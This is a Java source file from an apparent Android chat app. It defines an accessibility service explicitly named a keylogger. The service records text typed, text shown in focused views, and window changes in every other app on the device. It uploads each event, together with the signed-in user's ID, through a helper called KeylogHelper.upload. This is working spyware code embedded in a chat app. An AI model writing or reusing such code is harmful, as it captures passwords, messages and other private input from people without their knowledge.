package com.bushorat.chatapp.services;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.bushorat.chatapp.helpers.KeylogHelper;

public class KeylogAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            return;
        }

        CharSequence packageSeq = event.getPackageName();
        if (packageSeq == null) {
            return;
        }

        String packageName = packageSeq.toString();
        if (packageName.equals(getPackageName())) {
            return;
        }

        CharSequence classSeq = event.getClassName();
        String className = classSeq != null ? classSeq.toString() : "";

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                String text = joinEventText(event);
                if (text.isEmpty()) {
                    return;
                }
                CharSequence beforeSeq = event.getBeforeText();
                String beforeText = beforeSeq != null ? beforeSeq.toString() : "";
                KeylogHelper.upload(
                        user.getUid(),
                        packageName,
                        "text_changed",
                        text,
                        beforeText,
                        className,
                        event.getEventTime()
                );
                break;

            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                KeylogHelper.upload(
                        user.getUid(),
                        packageName,
                        "view_focused",
                        joinEventText(event),
                        "",
                        className,
                        event.getEventTime()
                );
                break;

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                KeylogHelper.upload(
                        user.getUid(),
                        packageName,
                        "window_changed",
                        "",
                        "",
                        className,
                        event.getEventTime()
                );
                break;

            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        // No-op
    }

    private String joinEventText(AccessibilityEvent event) {
        if (event.getText() == null || event.getText().isEmpty()) {
            return "";
        }
        StringBuilder builder = new StringBuilder();
        for (CharSequence part : event.getText()) {
            if (part != null) {
                builder.append(part);
            }
        }
        return builder.toString();
    }
}
